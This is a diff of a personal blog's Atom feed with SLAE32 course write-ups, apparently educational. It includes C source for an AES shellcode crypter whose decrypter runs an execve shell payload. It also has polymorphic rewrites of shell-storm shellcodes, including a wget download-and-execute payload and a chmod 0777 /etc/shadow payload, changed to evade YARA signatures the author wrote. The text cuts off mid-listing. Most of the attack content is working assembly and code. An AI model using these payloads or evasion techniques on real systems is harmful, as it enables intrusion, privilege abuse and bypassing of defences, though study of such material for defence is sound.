@@ -1,4 +1,862 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-09T11:50:48+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jeremy Catelain</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-05T08:45:58+02:00</published><updated>2022-10-05T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-15T14:46:12+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jeremy Catelain</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/05/Assign7-Crypter.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-05T08:45:58+02:00</published><updated>2022-10-05T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/05/Assign7-Crypter</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/05/Assign7-Crypter.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Create a custom crypter like the one shown in the “crypters” video&lt;/li&gt;
+  &lt;li&gt;Free to use any existing encryption schema&lt;/li&gt;
+  &lt;li&gt;Can use any programmming language&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!--more--&gt;
+
+&lt;h3 id=&quot;-aes-128-ecb-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; AES 128 ECB &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;For this assessment, I decided to use the AES128 encryption algorithm in the ECB mode from the OpenSSL library.&lt;/p&gt;
+
+&lt;p&gt;For reminder, the AES (Advanced Encyrption Standard) is a variation of the Rjindael encryption algorithm with fixed block size of of 128 bits, and with a key size of 128, 192 or 256 bits.
+The key size defined the number of transformation rounds that will convert your plaintext data into the ciphertext.&lt;/p&gt;
+
+&lt;p&gt;As follows the number of rounds per key size:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;10 rounds for 128-bit keys.&lt;/li&gt;
+  &lt;li&gt;12 rounds for 192-bit keys.&lt;/li&gt;
+  &lt;li&gt;14 rounds for 256-bit keys.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The AES encryption algorithm is composed of the following steps (if a 128 cipher key is used):&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Key Scheduling / Key Expension - Define the round keys derived from the cipher key using the AES Key Scheduling.&lt;/li&gt;
+  &lt;li&gt;Initial round key addition (AddRoundKey) - The state (128 bits block of plaintext that we want to encrypt) is combined with a byte of the round key (cipher key) using bitwise xor.&lt;/li&gt;
+  &lt;li&gt;Then the following steps are performed 9 times:
+    &lt;ul&gt;
+      &lt;li&gt;SubBytes - Substitution step&lt;/li&gt;
+      &lt;li&gt;ShiftRows - Transposition step&lt;/li&gt;
+      &lt;li&gt;MixColumns - Linear mixing operation&lt;/li&gt;
+      &lt;li&gt;AddRoundKey - Xoring step&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Final Round:
+    &lt;ul&gt;
+      &lt;li&gt;SubBytes - Substitution step&lt;/li&gt;
+      &lt;li&gt;ShiftRows - Transposition step&lt;/li&gt;
+      &lt;li&gt;MixColumns - Linear mixing operation&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment7/algo.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For more information you can check the following sources:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Advanced_Encryption_Standard&quot; style=&quot;color:#2d8fb3;&quot;&gt;en.wikipedia.org&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=O4xNJsjtN6E&amp;amp;t=473s&quot; style=&quot;color:#2d8fb3;&quot;&gt;Computerphile&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=pSCoquEJsIo&quot; style=&quot;color:#2d8fb3;&quot;&gt;Hafnium - Sécurité informatique (French)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Then, as I mentionned previously, I used the ECB encryption mode, which basically repeat the encryption operation described previously on every 128 bits of the payload that we want to encrypt.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment7/modeecb.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For more information you can check the following source:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.highgo.ca/2019/08/08/the-difference-in-five-modes-in-the-aes-encryption-algorithm/&quot; style=&quot;color:#2d8fb3;&quot;&gt;AES modes - www.highgo.ca&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;-explanation-of-the-work-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Explanation of the work &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;So, as i mentionned previously, I used the AES128 encryption algorithm from the OpenSSL library which is composed of several functions.&lt;/p&gt;
+
+&lt;p&gt;The first one to use if the &lt;strong&gt;&lt;em&gt;AES_set_encrypt_key()&lt;/em&gt;&lt;/strong&gt; which corresponds to the AES Key Scheduling / Key Expension activity.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AES_set_encrypt_key(encryption_key, 128, &amp;amp;enc_key);  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, we have to perform the encryption of the payload with the &lt;strong&gt;&lt;em&gt;AES_encrypt()&lt;/em&gt;&lt;/strong&gt; function.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;while(c1 &amp;lt; shellcode_len){
+	AES_encrypt(shellcode + c1, enc_out + c1, &amp;amp;enc_key); 
+	c1 += 16;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the first, to ensure that the encryption and the decryption went well.
+To do so, I used the &lt;strong&gt;&lt;em&gt;AES_set_decrypt_key()&lt;/em&gt;&lt;/strong&gt; function which does the same as the &lt;strong&gt;&lt;em&gt;AES_set_encrypt_key()&lt;/em&gt;&lt;/strong&gt; function. the  I decrypted as well the shellcode by using&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AES_set_decrypt_key(encryption_key, 128, &amp;amp;dec_key);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And finally, I used the &lt;strong&gt;&lt;em&gt;AES_decrypt()&lt;/em&gt;&lt;/strong&gt; function which _decrypt 128 bits by 128 bits our encrypted shellcode.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;while(c2 &amp;lt; enc_out_len){
+	AES_decrypt(enc_out + c2, dec_out + c2, &amp;amp;dec_key);
+	c2 += 16;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To perform this assessment, is wrote tow codes, a first one which take as input the encryption key that will be used to encrypt the shellcode.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment7/execution.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And another one, which decrypt the encrypted shellcode by providing the encryption key and execute it at the same time.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment7/execution2.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Link to the OpenBSD manual:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;https://man.openbsd.org/AES_encrypt.3&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;You can find as follows respectively the source code to encrypt a simple shellcode and the source code to decrypt and execute the shellcode.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Source code AES Crypter:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*
+
+    Author : Jeremy Catelain
+    Filename : aes-cryptor.c
+
+*/
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;openssl/aes.h&amp;gt;
+
+// GLOBAL VARIABLES
+unsigned char shellcode[] = \
+&quot;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;; // to modify 
+
+AES_KEY enc_key, dec_key;
+// Initialisation tables for the encrypted and decrypted payloads
+unsigned char enc_out[100];
+unsigned char dec_out[100];
+
+// Shellcode printer
+void print_shellcode(unsigned char shellc[]) {
+    int len = strlen(shellc);
+    for (int i = 0; i &amp;lt; len; i++) {
+        printf(&quot;\\x%02x&quot;, shellc[i]);
+    }
+}
+
+// Encryption 
+void encryption(unsigned char *encryption_key, int shellcode_len){
+
+    AES_set_encrypt_key(encryption_key, 128, &amp;amp;enc_key); // AES key scheduling - Expand the Userkey, which is bits long into the key structure to preprare for encryption.
+
+    // The encryption is performed 16 bytes by 16 bytes
+    long c1 = 0;
+    while(c1 &amp;lt; shellcode_len){
+	    AES_encrypt(shellcode + c1, enc_out + c1, &amp;amp;enc_key); 
+	    c1 += 16;
+    }
+}
+
+// Decryption
+void decryption(unsigned char *encryption_key, int enc_out_len){
+
+    AES_set_decrypt_key(encryption_key, 128, &amp;amp;dec_key);
+
+    // Decyption performed 16 bytes by 16 bytes
+    long c2 = 0;
+    while(c2 &amp;lt; enc_out_len){
+	    AES_decrypt(enc_out + c2, dec_out + c2, &amp;amp;dec_key);
+	    c2 += 16;
+    }
+}
+
+int aes_workflow(unsigned char *encryption_key) {
+
+    int shellcode_len = strlen(shellcode);
+
+    //Encryption of the payload
+    encryption(encryption_key, shellcode_len);
+
+    // Length of the encrypted payload
+    int enc_out_len = strlen((unsigned char *)enc_out);
+
+    //Decryption of the payload
+    decryption(encryption_key, enc_out_len);
+
+    // Length of the decrypted payload
+    int dec_out_len = strlen((unsigned char *)dec_out);
+
+    if (shellcode_len != dec_out_len){
+	    printf(&quot;ATTENTION: Length of the Encryption key too small.\n&quot;);
+    }
+
+    printf(&quot;Original:\t&quot;);
+    print_shellcode(shellcode);
+    printf(&quot;\nEncrypted:\t&quot;);
+    print_shellcode(enc_out);
+    printf(&quot;\nDecrypted:\t&quot;);
+    print_shellcode(dec_out);
+
+}
+
+int main(int argc, char* argv[])
+{
+    unsigned char *encryption_key;
+    int encryption_key_length;
+    encryption_key = (unsigned char *)argv[1];
+    encryption_key_length = strlen((unsigned char *)encryption_key);
+    printf(&quot;Encryption started...\n&quot;);
+
+    printf(&quot;The Encryption key length : %d\n&quot;, encryption_key_length);
+    // Verification that the key length is 16 bytes
+    if (encryption_key_length &amp;gt; 16){
+	    printf (&quot;ATTENTION: Only the first 16 bytes of the Encryption key will be taken: \&quot;&quot;);
+	    for (int i=0; i&amp;lt;16; i++){
+		    printf(&quot;%c&quot;,*(encryption_key+i));
+	    }
+	    printf(&quot;\&quot;\n&quot;);
+    }
+    aes_workflow(encryption_key);
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Source code AES Decrypter:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*
+
+    Author : Jeremy Catelain
+    Filename : aes-cryptor.c
+
+*/
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;openssl/aes.h&amp;gt;
+
+// GLOBAL VARIABLES
+unsigned char encrypted_shellcode[] = \
+&quot;\xc3\xf8\x41\x52\xf0\xfc\x42\x13\xb1\x76\x52\x62\xaa\x98\x92\x3e\x99\x74\x26\x4b\x06\x48\x2d\xd7\x56\x33\x96\xc7\xc8\x24\x7a\x6e&quot;; // to modify 
+
+AES_KEY dec_key;
+// Initialisation table for the shellcode
+unsigned char shellcode[100];
+
+// Shellcode printer
+void print_shellcode(unsigned char shellc[]) {
+    int len = strlen(shellc);
+    for (int i = 0; i &amp;lt; len; i++) {
+        printf(&quot;\\x%02x&quot;, shellc[i]);
+    }
+}
+
+// Decryption
+void decryption(unsigned char *decryption_key, int encrypted_shellcode_len){
+
+    AES_set_decrypt_key(decryption_key, 128, &amp;amp;dec_key);
+
+    // Decyption performed 16 bytes by 16 bytes
+    long c = 0;
+    while(c &amp;lt; encrypted_shellcode_len){
+        AES_decrypt(encrypted_shellcode + c, shellcode + c, &amp;amp;dec_key);
+        c += 16;
+    }
+}
+
+int main(int argc, char* argv[])
+{
+
+    unsigned char* decryption_key = (unsigned char *)argv[1];
+
+    printf(&quot;Decryption started...\n&quot;);
+
+    int encrypted_shellcode_len = strlen((unsigned char *)encrypted_shellcode);
+    printf(&quot;Shellcode Length: %d\n&quot;, encrypted_shellcode_len);
+
+    decryption(decryption_key, encrypted_shellcode_len);
+
+    int (*ret)() = (int(*)())shellcode;
+
+    ret();
+
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Create a custom crypter like the one shown in the “crypters” video Free to use any existing encryption schema Can use any programmming language</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/05/Assign6-Poly.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-05T08:45:58+02:00</published><updated>2022-10-05T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/05/Assign6-Poly</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/05/Assign6-Poly.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Take up at least 3 shellcodes from shell-Storm and create a polymorphic versions to beat the pattern matching&lt;/li&gt;
+  &lt;li&gt;The polymorphic version cannot be larger than 150% of the existing shellcode&lt;/li&gt;
+  &lt;li&gt;Bonus points for making it shorter in length than the original&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As follows the list of shellcodes that we are going to change into polymorphic ones:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;downloadexec&lt;/li&gt;
+  &lt;li&gt;chmod 0777 /etc/shadow&lt;/li&gt;
+  &lt;li&gt;Add r00t user to /etc/passwd&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!--more--&gt;
+
+&lt;h3 id=&quot;--part-1---downloadexec-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt;  Part 1 - downloadexec &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Link to the original shellcode: http://shell-storm.org/shellcode/files/shellcode-862.php&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;First we retrieved the shellcode and make it works with the localhost.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment6/assignment6.9.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The shellcode download a file “x” and execute it which displays an “HelloWorld” as we can see.&lt;/p&gt;
+
+&lt;p&gt;We supposed that the yara rule as follows flagged our original shellcode.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rule download_exec_shell {
+    meta:
+	    description = &quot;Personal rule&quot;
+    strings:
+	    $y1 = {74 2f 2f 78} 
+	    $y2 = {6C 68 6F 73}
+	    $y3 = {6C 6f 63 61}
+	    $y4 = {2f 77 67 65}
+	    $y5 = {2f 62 69 6e}
+	    $y6 = {2f 75 73 72}
+    condition:
+    $y1 and $y2 and $y3 or $y4 and $y5 and $y6 
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The y1 to y3 strings correspond to the instruction for the setting of the “localhost/x”:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push 0x782f2f74  ; x//t
+push 0x736F686C  ; sohl
+push 0x61636f6c  ; acol
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the y4 to y6 strings correspond to the instrution for the setting of the “/usr/bin/wget”:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push 0x74
+push 0x6567772f ;egw/
+push 0x6e69622f ;nib/
+push 0x7273752f ;rsu/ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The Yara rule triggered the detection as follows:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment6/assignment6.7.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, we modified our strings to bypass the Yara rule.&lt;/p&gt;
+
+&lt;p&gt;Modifications to bypass the “localhost/x” condition:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov dword [esp-4], 0x782f2f74 ; t//x
+mov dword [esp-8], 0x736F686C ; lhos
+mov esi, 0x50525e5b
+add esi, 0x11111111
+mov dword [esp-12], esi ; loca
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Modifications to bypass the “/usr/bin/wget” condition:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov byte [esp-1], 0x74
+mov esi, 0x5456661e
+add esi, 0x11111111
+mov dword [esp-5], esi ;egw/
+mov dword [esp-9], 0x6e69622f ;nib/
+mov dword [esp-13], 0x7273752f ;rsu/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, our modification succeded to bypass the yara rule.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment6/assignment6.8.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Shellcode Length details&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Length of the original shellcode: 103 bytes&lt;/li&gt;
+  &lt;li&gt;Length of the modified shellcode: 142 bytes&lt;/li&gt;
+  &lt;li&gt;Percentage length of the modified shellcode from the original: 137.8%&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Original shellcode:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; INITIAL SHELLCODE
+; Filename: downloadexec.nasm
+; Author: Daniel Sauder
+; Website: http://govolution.wordpress.com/
+; Tested on: Ubuntu 12.04 / 32Bit
+; License: http://creativecommons.org/licenses/by-sa/3.0/
+
+; Shellcode:
+; - download 192.168.2.222/x with wget
+; - chmod x
+; - execute x
+; - x is an executable
+; - length 108 bytes
+
+global _start
+
+section .text
+
+_start:
+
+    ;fork
+    xor eax,eax
+    mov al,0x2
+    int 0x80
+    xor ebx,ebx
+    cmp eax,ebx
+    jz child
+  
+    ;wait(NULL)
+    xor eax,eax
+    mov al,0x7
+    int 0x80
+    
+    ;chmod x
+    xor ecx,ecx
+    xor eax, eax
+    push eax
+    mov al, 0xf
+    push 0x78
+    mov ebx, esp
+    xor ecx, ecx
+    mov cx, 0x1ff
+    int 0x80
+
+    ;exec x
+    xor eax, eax
+    push eax
+    push 0x78
+    mov ebx, esp
+    push eax
+    mov edx, esp
+    push ebx
+    mov ecx, esp
+    mov al, 11
+    int 0x80
+
+child:
+    ;download 192.168.2.222//x with wget
+    push 0xb
+    pop eax
+    cdq
+    push edx
+
+    push 0x782f2f74  ; x//t
+    push 0x736F686C  ; sohl
+    push 0x61636f6c  ; acol
+    mov ecx,esp
+    push edx
+
+    push 0x74 ;t
+    push 0x6567772f ;egw/
+    push 0x6e69622f ;nib/
+    push 0x7273752f ;rsu/
+    mov ebx,esp
+    push edx
+    push ecx
+    push ebx
+    mov ecx,esp
+    int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Modified shellcode:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; MODIFIED SHELLCODE
+; Filename: downloadexecpoly.nasm
+; Author: Jeremy Catelain
+
+global _start
+
+section .text
+
+_start:
+
+    ;fork
+    xor eax,eax
+    mov al,0x1
+    add al, 0x1
+    int 0x80
+    xor ebx,ebx
+    cmp eax,ebx
+    jz child
+  
+    ;wait(NULL)
+    xor eax,eax
+    mov al,0x7
+    int 0x80
+    
+    ;chmod x
+    xor ecx,ecx
+    mov eax, ecx
+    push eax
+    mov al, 0xf
+    push 0x78
+    mov ebx, esp
+    xor ecx, ecx
+    mov cx, 0x1ff
+    int 0x80
+
+    ;exec x
+    xor eax, eax
+    push eax
+    push 0x78
+    mov ebx, esp
+    push eax
+    mov edx, esp
+    push ebx
+    mov ecx, esp
+    mov al, 11
+    int 0x80
+
+child:
+    ;download 192.168.2.222//x with wget
+    push 0xb
+    pop eax
+    cdq
+    push edx
+
+    mov dword [esp-4], 0x782f2f74 ; t//x
+    mov dword [esp-8], 0x736F686C ; lhos
+    mov esi, 0x50525e5b
+    add esi, 0x11111111
+    mov dword [esp-12], esi ; loca
+
+    sub esp, 12
+
+    mov ecx,esp
+    push edx
+
+    mov byte [esp-1], 0x74
+    mov esi, 0x5456661e
+    add esi, 0x11111111
+    mov dword [esp-5], esi ;egw/
+    mov dword [esp-9], 0x6e69622f ;nib/
+    mov dword [esp-13], 0x7273752f ;rsu/
+    sub esp, 13
+    mov ebx,esp
+    push edx
+    push ecx
+    push ebx
+    mov ecx,esp
+    int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;--part-2---chmod-0777-etcshadow-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt;  Part 2 - chmod 0777 /etc/shadow &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;link to the original shellcode: http://shell-storm.org/shellcode/files/shellcode-875.php&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The aim of this second shellcode is to modify the access rights on the /etc/shadow file. To do so, only the chmod syscall (EAX = 0xf) is performed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment6/assignment6.10.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We supposed that the yara rule as follows flagged our original shellcode.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rule chmodshadow {
+    meta:
+	    description = &quot;Personal rule&quot;
+    strings:
+	    $y1 = {2f 2f 73 68}
+	    $y2 = {2f 65 74 63}
+	    $y3 = {3e 1f 3a 56}
+    condition:
+    $y1 and $y2 and $y3
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The y1 to y3 strings correspond to the instruction for the setting of the “/etc/shadow”:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov esi, 0x563a1f3e
+add esi, 0x21354523
+mov dword [esp-4], esi
+mov dword [esp-8], 0x68732f2f
+mov dword [esp-12], 0x6374652f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The Yara rule effectively detected our shellcode:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment6/assignment6.16.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, we modified our strings to bypass the Yara rule.&lt;/p&gt;
+
+&lt;p&gt;Modifications to bypass the ““/etc/shadow”” condition:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov esi, 0x6374ef32 
+add esi, 0x13FA752F ;0x776F6461
+mov dword [esp-4], esi
+sub esi, 0xefc3532
+mov dword [esp-8], esi ; 0x68732f2f
+mov dword [esp-12], 0x6374652f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, our modification succeded to bypass the yara rule.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment6/assignment6.17.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Shellcode Length details&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Length of the original shellcode: 49 bytes&lt;/li&gt;
+  &lt;li&gt;Length of the modified shellcode: 52 bytes&lt;/li&gt;
+  &lt;li&gt;Percentage length of the modified shellcode from the original: 106%&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Original shellcode:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; Title:    chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes
+; Platform: linux/x86
+; Date:     2014-06-22
+; Author:   Osanda Malith Jayathissa (@OsandaMalith)
+
+section .text
+global _start
+
+_start: 
+mov ebx, eax
+xor eax, ebx
+push dword eax
+mov esi, 0x563a1f3e
+add esi, 0x21354523
+mov dword [esp-4], esi
+mov dword [esp-8], 0x68732f2f
